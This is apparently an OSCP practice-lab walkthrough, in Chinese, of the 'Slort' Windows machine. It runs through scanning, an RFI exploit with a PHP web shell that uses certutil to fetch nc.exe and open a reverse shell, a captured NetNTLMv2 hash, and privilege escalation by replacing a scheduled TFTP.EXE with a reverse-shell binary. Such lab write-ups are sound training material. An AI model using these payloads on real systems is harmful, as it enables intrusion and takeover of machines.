## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ sudo nmap -A -sV -sS -T4 192.168.221.53
[sudo] ouyang 的密碼：
抱歉，請重試。
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-23 22:14 CST
Nmap scan report for 192.168.221.53
Host is up (0.26s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings:
|   NULL, TerminalServerCookie:
|_    Host '192.168.45.179' is not allowed to connect to this MariaDB server
4443/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.221.53:4443/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
8080/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.221.53:8080/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=8/23%Time=64E61451%P=aarch64-unknown-linux-gn
SF:u%r(NULL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.179'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Ter
SF:minalServerCookie,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.179'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/23%OT=21%CT=1%CU=41450%PV=Y%DS=4%DC=T%G=Y%TM=64E6148
OS:8%P=aarch64-unknown-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10E%TI=I%TS=U)SEQ(SP=F
OS:C%GCD=1%ISR=10E%TS=U)OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54EN
OS:W8NNS%O5=M54ENW8NNS%O6=M54ENNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FF
OS:FF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=8
OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=4E7D%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-08-23T14:15:25
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   305.44 ms 192.168.45.1
2   305.41 ms 192.168.45.254
3   305.45 ms 192.168.251.1
4   305.52 ms 192.168.221.53

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.65 seconds
```

搜尋確認相關套件版本 [xampp](https://www.apachefriends.org/blog/new_xampp_20200519.html)

透過 dirsearch 發現有 phpinfo.php 頁面 [phpinfo](http://192.168.221.53:8080/dashboard/phpinfo.php)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ dirsearch -u http://192.168.221.53:8080/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15490

Output File: /home/ouyang/.dirsearch/reports/192.168.221.53-8080/-_23-08-23_22-26-42.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-08-23_22-26-42.log

Target: http://192.168.221.53:8080/

[22:26:43] Starting:
[22:26:48] 403 -    1KB - /%C0%AE%C0%AE%C0%AF
[22:26:48] 403 -    1KB - /%3f/
[22:26:50] 403 -    1KB - /%ff
[22:26:57] 403 -    1KB - /.htaccess.save
[22:26:57] 403 -    1KB - /.htaccess_sc
[22:26:57] 403 -    1KB - /.htaccess_orig
[22:26:57] 403 -    1KB - /.htaccess_extra
[22:26:57] 403 -    1KB - /.htaccessOLD
[22:26:57] 403 -    1KB - /.htaccessOLD2
[22:26:57] 403 -    1KB - /.htpasswd_test
[22:26:57] 403 -    1KB - /.htaccess.orig
[22:26:57] 403 -    1KB - /.htm
[22:26:57] 403 -    1KB - /.htaccess.bak1
[22:26:57] 403 -    1KB - /.ht_wsr.txt
[22:26:57] 403 -    1KB - /.html
[22:26:57] 403 -    1KB - /.htaccessBAK
[22:26:57] 403 -    1KB - /.htpasswds
[22:26:57] 403 -    1KB - /.httr-oauth
[22:26:58] 403 -    1KB - /.htaccess.sample
[22:27:17] 403 -    1KB - /Trace.axd::$DATA
[22:27:20] 200 -  782B  - /Webalizer/
[22:28:22] 403 -    1KB - /cgi-bin/
[22:28:22] 500 -    1KB - /cgi-bin/printenv.pl
[22:28:30] 301 -  351B  - /dashboard  ->  http://192.168.221.53:8080/dashboard/
[22:28:31] 200 -    6KB - /dashboard/howto.html
[22:28:31] 200 -   31KB - /dashboard/faq.html
[22:28:33] 200 -   78KB - /dashboard/phpinfo.php
[22:28:38] 403 -    1KB - /error/
[22:28:41] 503 -    1KB - /examples/servlet/SnoopServlet
[22:28:41] 503 -    1KB - /examples/jsp/snp/snoop.jsp
[22:28:41] 503 -    1KB - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[22:28:41] 503 -    1KB - /examples/servlets/servlet/CookieExample
[22:28:41] 503 -    1KB - /examples/servlets/index.html
[22:28:41] 503 -    1KB - /examples/servlets/servlet/RequestHeaderExample
[22:28:41] 200 -   30KB - /favicon.ico
[22:28:41] 503 -    1KB - /examples
[22:28:42] 503 -    1KB - /examples/
[22:28:50] 301 -  345B  - /img  ->  http://192.168.221.53:8080/img/
[22:28:50] 302 -    0B  - /index.php  ->  http://192.168.221.53:8080/dashboard/
[22:28:51] 302 -    0B  - /index.pHp  ->  http://192.168.221.53:8080/dashboard/
[22:28:51] 302 -    0B  - /index.php/login/  ->  http://192.168.221.53:8080/dashboard/
[22:28:51] 403 -    1KB - /index.php::$DATA
[22:28:51] 302 -    0B  - /index.php.  ->  http://192.168.221.53:8080/dashboard/
[22:29:15] 403 -    1KB - /phpmyadmin/doc/html/index.html
[22:29:15] 403 -    1KB - /phpmyadmin/docs/html/index.html
[22:29:15] 403 -    1KB - /phpmyadmin/ChangeLog
[22:29:15] 403 -    1KB - /phpmyadmin/README
[22:29:17] 403 -    1KB - /phpmyadmin
[22:29:19] 403 -    1KB - /phpmyadmin/phpmyadmin/index.php
[22:29:19] 403 -    1KB - /phpmyadmin/index.php
[22:29:20] 403 -    1KB - /phpmyadmin/scripts/setup.php
[22:29:20] 403 -    1KB - /phpmyadmin/
[22:29:32] 403 -    1KB - /server-info
[22:29:32] 403 -    1KB - /server-status
[22:29:32] 403 -    1KB - /server-status/
[22:29:36] 301 -  346B  - /site  ->  http://192.168.221.53:8080/site/
[22:29:36] 301 -   27B  - /site/  ->  index.php?page=main.php
[22:29:52] 403 -    1KB - /web.config::$DATA
[22:29:53] 403 -    1KB - /webalizer
[22:29:56] 200 -  774B  - /xampp/
```

![[截圖 2023-08-23 下午10.29.44.png]]![[截圖 2023-08-23 下午10.35.35.png]]

接著看 4443 port 

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ dirsearch -u http://192.168.221.53:4443/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15490

Output File: /home/ouyang/.dirsearch/reports/192.168.221.53-4443/-_23-08-23_22-42-27.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-08-23_22-42-27.log

Target: http://192.168.221.53:4443/

[22:42:28] Starting:
[22:42:33] 403 -    1KB - /%3f/
[22:42:35] 403 -    1KB - /%C0%AE%C0%AE%C0%AF
[22:42:36] 403 -    1KB - /%ff
[22:42:42] 403 -    1KB - /.ht_wsr.txt
[22:42:42] 403 -    1KB - /.htaccess.orig
[22:42:42] 403 -    1KB - /.htaccess.sample
[22:42:42] 403 -    1KB - /.htaccess.bak1
[22:42:42] 403 -    1KB - /.htaccess.save
[22:42:42] 403 -    1KB - /.htaccess_orig
[22:42:42] 403 -    1KB - /.htaccess_extra
[22:42:42] 403 -    1KB - /.htaccess_sc
[22:42:43] 403 -    1KB - /.htaccessBAK
[22:42:43] 403 -    1KB - /.htaccessOLD2
[22:42:43] 403 -    1KB - /.htpasswds
[22:42:43] 403 -    1KB - /.htpasswd_test
[22:42:43] 403 -    1KB - /.htm
[22:42:43] 403 -    1KB - /.htaccessOLD
[22:42:43] 403 -    1KB - /.httr-oauth
[22:42:43] 403 -    1KB - /.html
[22:43:03] 403 -    1KB - /Trace.axd::$DATA
[22:43:05] 200 -  782B  - /Webalizer/
[22:44:09] 403 -    1KB - /cgi-bin/
[22:44:10] 500 -    1KB - /cgi-bin/printenv.pl
[22:44:19] 301 -  351B  - /dashboard  ->  http://192.168.221.53:4443/dashboard/
[22:44:20] 200 -    6KB - /dashboard/howto.html
[22:44:20] 200 -   31KB - /dashboard/faq.html
[22:44:21] 200 -   78KB - /dashboard/phpinfo.php
[22:44:28] 403 -    1KB - /error/
[22:44:31] 503 -    1KB - /examples/servlets/servlet/CookieExample
[22:44:31] 503 -    1KB - /examples/servlets/index.html
[22:44:31] 503 -    1KB - /examples
[22:44:31] 503 -    1KB - /examples/
[22:44:31] 503 -    1KB - /examples/jsp/snp/snoop.jsp
[22:44:31] 503 -    1KB - /examples/servlet/SnoopServlet
[22:44:31] 503 -    1KB - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[22:44:31] 503 -    1KB - /examples/servlets/servlet/RequestHeaderExample
[22:44:31] 200 -   30KB - /favicon.ico
[22:44:41] 301 -  345B  - /img  ->  http://192.168.221.53:4443/img/
[22:44:43] 302 -    0B  - /index.php  ->  http://192.168.221.53:4443/dashboard/
[22:44:43] 302 -    0B  - /index.php.  ->  http://192.168.221.53:4443/dashboard/
[22:44:43] 302 -    0B  - /index.pHp  ->  http://192.168.221.53:4443/dashboard/
[22:44:43] 403 -    1KB - /index.php::$DATA
[22:44:43] 302 -    0B  - /index.php/login/  ->  http://192.168.221.53:4443/dashboard/
[22:45:13] 403 -    1KB - /phpmyadmin/ChangeLog
[22:45:13] 403 -    1KB - /phpmyadmin/docs/html/index.html
[22:45:13] 403 -    1KB - /phpmyadmin/doc/html/index.html
[22:45:13] 403 -    1KB - /phpmyadmin/README
[22:45:15] 403 -    1KB - /phpmyadmin
[22:45:17] 403 -    1KB - /phpmyadmin/
[22:45:17] 403 -    1KB - /phpmyadmin/index.php
[22:45:17] 403 -    1KB - /phpmyadmin/phpmyadmin/index.php
[22:45:17] 403 -    1KB - /phpmyadmin/scripts/setup.php
[22:45:30] 403 -    1KB - /server-status
[22:45:30] 403 -    1KB - /server-info
[22:45:30] 403 -    1KB - /server-status/
[22:45:33] 301 -  346B  - /site  ->  http://192.168.221.53:4443/site/
[22:45:34] 301 -   27B  - /site/  ->  index.php?page=main.php
[22:45:49] 403 -    1KB - /web.config::$DATA
[22:45:50] 403 -    1KB - /webalizer
[22:45:52] 200 -  774B  - /xampp/

Task Completed
```


猜測可能有 LFI or RFI 漏洞，

![[截圖 2023-08-23 下午11.18.17.png]]

確認有 LFI 漏洞，在 kali 開個 nc 來測試 RFI

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ nc -nvlp 80
listening on [any] 80 ...
```

靶機連線

```json
http://192.168.221.53:8080/site/index.php?page=http://192.168.45.179/test
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.179] from (UNKNOWN) [192.168.221.53] 51056
GET /test HTTP/1.0
Host: 192.168.45.179
Connection: close
```

確認有 RFI 漏洞，依照 [github](https://github.com/ucc-hk/OSCP-Kit/blob/master/File%20Transfer.md) 嘗試上傳 reverse shell 並執行，並開啟 python http server

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ cat web_shell.php
<?php echo shell_exec('certutil.exe -urlcache -split -f "http://192.168.45.179:8000/nc.exe" nc.exe && nc.exe -nv 192.168.45.179 4444 -e cmd.exe');?>
```

靶機執行

```http
http://192.168.221.53:8080/site/index.php?page=http://192.168.45.179:8000/web_shell.php
```

kali nc:

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.179] from (UNKNOWN) [192.168.221.53] 51191
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\site>
```

	重連 VPN，IP 換成 192.168.199.53

### 提權

```json
����������͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    rupert::SLORT:1122334455667788:3f0eb09ff8654baeb79c12b32c4a36ab:0101000000000000f7ac8c8194d6d90147f4ed778225081c00000000080030003000000000000000000000000020000085ed7e6b8d60eecb9d9166ec6860e3d7b50754c91f4ec967447609787e1731930a00100000000000000000000000000000000000090000000000000000000000
```

無法透過 rockyou.txt 爆破，

發現 C:\\ 底下有個 backup 資料夾，裡面有個 info.txt

```json
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```

看起來每 5 分鐘會執行一次，去 schedule job 確認，但沒看到資訊，可能透過 script 來完成或權限不足，先嘗試看看 (新的 TFTP.EXE 為 kali msfvenom 製作的 reverse shell)

```json
C:\Backup>move TFTP.EXE TFTP_old.exe
move TFTP.EXE TFTP_old.exe
        1 file(s) moved.

C:\Backup>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

08/24/2023  07:26 AM    <DIR>          .
08/24/2023  07:26 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
08/24/2023  07:22 AM                 0 schtasks.txt
06/23/2020  07:49 PM            73,802 TFTP_old.exe
               4 File(s)         85,179 bytes
               2 Dir(s)  28,600,082,432 bytes free

C:\Backup>curl http://192.168.45.157:8000/TFTP.EXE --output TFTP.EXE
curl http://192.168.45.157:8000/TFTP.EXE --output TFTP.EXE
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7168  100  7168    0     0   7168      0  0:00:01 --:--:--  0:00:01 13499
```

等一陣子後，get shell，提權成功！
kali:

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Slort]
└─$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [192.168.45.157] from (UNKNOWN) [192.168.199.53] 50923
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
slort\administrator
```

再嘗試確認 schedule job 就有看到了

```json
C:\WINDOWS\system32>schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST 2>nul | findstr TaskName
TaskName:      \Backup
TaskName:      \MicrosoftEdgeUpdateTaskMachineCore1d7e8638d16a4af
TaskName:      \MicrosoftEdgeUpdateTaskMachineCore1d7e8638d16a4af
TaskName:      \MicrosoftEdgeUpdateTaskMachineUA
TaskName:      \OneDrive Reporting Task-S-1-5-21-2032240294-1210393520-1520670448-1002
TaskName:      \OneDrive Reporting Task-S-1-5-21-2032240294-1210393520-1520670448-500
TaskName:      \OneDrive Standalone Update Task-S-1-5-21-2032240294-1210393520-1520670448-1001
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
```